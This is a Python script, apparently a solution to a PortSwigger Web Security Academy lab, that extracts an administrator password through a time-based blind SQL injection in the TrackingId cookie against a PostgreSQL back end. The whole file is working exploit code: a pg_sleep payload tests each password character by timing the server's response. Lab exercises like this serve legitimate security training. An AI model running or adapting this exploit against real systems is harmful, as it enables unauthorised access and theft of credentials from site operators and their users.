#!/usr/bin/env python3
"""
Extract the 'administrator' password via time-based blind SQL injection.
PortSwigger lab: Blind SQL injection with time delays and information retrieval.
Injection point: TrackingId cookie (PostgreSQL).
"""
import requests
import string
import time
from urllib.parse import quote

# Configuration
URL = "https://0af1007d03e7a4268036080600d6000c.web-security-academy.net/"
CHARSET = string.ascii_lowercase + string.digits  # PortSwigger passwords: [a-z0-9]
LENGTH = 20  # password length found in step 4.3
SLEEP = 3  # delay (seconds) injected via pg_sleep
THRESHOLD = 2.5  # delay detection threshold

password = ""
print(f"[*] Target: {URL}")
print(f"[*] Extracting {LENGTH} characters...\n")

for pos in range(1, LENGTH + 1):
    for c in CHARSET:
        sql = (
            "x';SELECT CASE WHEN "
            f"(username='administrator' AND SUBSTRING(password,{pos},1)='{c}') "
            f"THEN pg_sleep({SLEEP}) ELSE pg_sleep(0) END FROM users--"
        )
        cookie = "TrackingId=" + quote(sql, safe="")
        t0 = time.time()
        requests.get(URL, headers={"Cookie": cookie})
        elapsed = time.time() - t0
        if elapsed > THRESHOLD:  # condition true, character found
            password += c
            print(f"[{pos:2d}/{LENGTH}] {password}")
            break
    else:
        print(f"[{pos:2d}/{LENGTH}] (no character detected - rerun?)")

print("\n[+] Administrator password:", password)
